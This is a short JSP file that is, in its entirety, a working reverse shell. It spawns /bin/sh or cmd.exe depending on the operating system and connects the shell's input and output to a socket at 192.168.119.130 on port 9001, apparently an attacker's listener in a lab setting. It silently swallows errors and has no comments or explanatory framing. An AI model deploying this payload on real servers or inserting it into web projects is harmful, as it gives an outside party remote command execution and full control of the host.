<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream cl;
    OutputStream pA;

    StreamConnector( InputStream cl, OutputStream pA )
    {
      this.cl = cl;
      this.pA = pA;
    }

    public void run()
    {
      BufferedReader dX  = null;
      BufferedWriter hAm = null;
      try
      {
        dX  = new BufferedReader( new InputStreamReader( this.cl ) );
        hAm = new BufferedWriter( new OutputStreamWriter( this.pA ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dX.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hAm.write( buffer, 0, length );
          hAm.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dX != null )
          dX.close();
        if( hAm != null )
          hAm.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.130", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
